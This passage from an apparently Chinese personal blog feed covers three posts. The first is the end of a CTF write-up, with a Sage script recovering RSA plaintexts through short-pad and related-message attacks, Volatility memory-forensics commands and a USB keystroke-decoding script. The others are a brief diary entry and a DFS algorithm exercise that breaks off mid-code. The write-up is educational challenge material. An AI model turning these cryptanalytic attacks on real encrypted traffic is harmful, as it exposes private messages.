keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n<span class="token operator">=</span> <span class="token number">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span>    c1<span class="token operator">=</span> <span class="token number">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span>    c2<span class="token operator">=</span> <span class="token number">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span>    e <span class="token operator">=</span> <span class="token number">5</span>    diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"difference of two messages is %d"</span> <span class="token operator">%</span> diff    m1 <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m2 <span class="token operator">=</span> m1 <span class="token operator">+</span> diff    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m2    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c2</code></pre><p>sage环境可以自己安装，也可以在线运行：<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>这几道misc感觉也姿势满满呢。比如内存取证，usb流量分析。</p></blockquote><h3 id="eazy-dump"><a href="#eazy-dump" class="headerlink" title="eazy_dump"></a>eazy_dump</h3><p>首先需要知道这是一个镜像文件，而kali下面的volatility可以进行内存取证，可以参考这一篇文章：<a href="https://www.jianshu.com/p/6438bc3302c8" target="_blank" rel="noopener">CTF内存取证</a></p><p>执行命令<code>volatility -f mem.data imageinfo</code>可以看到镜像信息：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205904.png" alt=""></p><p><code>volatility -f mem.data --profile=Win2008R2SP0x64 pslist</code>查看进程：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113210854.png" class="lazyload"></p><p><code>**volatility -f mem.data --profile=Win2008R2SP0x64 -p [PID] -D [dump 出的文件保存的目录]**</code>导出指定进程数据：</p><p>gimp可以读取.data文件，从原始数据中载入图像（需要注意调整的是宽度，这个最重要，当宽度为1457时最接近原图，然后越大就越不容易找到）：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113214227.png" class="lazyload"></p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>通过提取并且解密usb流量可以得到一段 malbolge 的代码，之前在中科大校赛上面也做过😄。</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205419.png" class="lazyload"></p><p>然后可以google上面搜个编译器运行一下，不同的编译器效果可能不一样，有可能这个编译器有用，另外一个没用。。</p><p>usbdecode.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#linux python2</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osDataFileName <span class="token operator">=</span> <span class="token string">"usb.dat"</span>presses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># check argv</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get argv</span>    pcapFilePath <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># get data of pcap</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r %s -T fields -e usb.capdata > %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcapFilePath<span class="token punctuation">,</span> DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># read data</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>DataFileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            presses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># handle</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> press <span class="token keyword">in</span> presses<span class="token punctuation">:</span>        Bytes <span class="token operator">=</span> press<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> normalKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"02"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># shift key is pressed.</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"01"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">"Ctrl+"</span> <span class="token operator">+</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Unknow Key : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># clean the temp data</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm ./%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>待更新。。。。。。。。。。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>我是一个菜鸡</title>
      <link href="/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/"/>
      <url>/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="菜鸡"><a href="#菜鸡" class="headerlink" title="菜鸡"></a>菜鸡</h1><p>你怎么这么菜啊！鸽了五天了！要做颓废菜鸡了吗😭！你又low又菜还不努力，又想随波逐流（咸鱼真香😄）。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 我是菜鸡 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DFS深搜_Oil_Deposits</title>
      <link href="/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
      <url>/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="一个DFS水题（对我来说不水）"><a href="#一个DFS水题（对我来说不水）" class="headerlink" title="一个DFS水题（对我来说不水）"></a>一个DFS水题（对我来说不水）</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 ≤ m ≤ 100 and 1 ≤ n ≤ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either ‘*’, representing theabsence of oil, or ‘@’, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>引用一下百度百科：</p><blockquote><p>这题考察的是DFS(Depth First Search)：</p><p>深度优先搜索是一种在开发爬虫早期使用较多的方法。它的目的是要达到被搜索结构的叶结点(即那些不包含任何<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>的<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTML文件</a>) 。在一个HTML文件中，当一个<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>被选择后，被链接的HTML文件将执行深度优先搜索，即在搜索其余的超链结果之前必须先完整地搜索单独的一条链。深度优先搜索沿着HTML文件上的<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>走到不能再深入为止，然后返回到某一个HTML文件，再继续选择该HTML文件中的其他超链。当不再有其他<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">超链</a>可选择时，说明搜索已经结束。</p></blockquote><blockquote><p>经常遇到的不仅有DFS，还有BFS(Breadth First Search):</p><p>宽度优先<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">搜索算法</a>（又称广度优先搜索）是最简便的图的搜索算法之一，这一算法也是很多重要的图的算法的原型。Dijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">单源最短路径</a>算法和Prim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">最小生成树</a>算法都采用了和宽度优先搜索类似的思想。其别名又叫BFS，属于一种盲目搜寻法，目的是系统地展开并检查图中的所有节点，以找寻结果。换句话说，它并不考虑结果的可能位置，彻底地搜索整张图，直到找到结果为止。</p><p>BFS在求解最短路径或者最短步数上有很多的应用。应用最多的是在走迷宫上。</p></blockquote><p>根据题意，我们需要向八个方向进行搜索，并且进行判断</p><p>可以用c++写出：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> 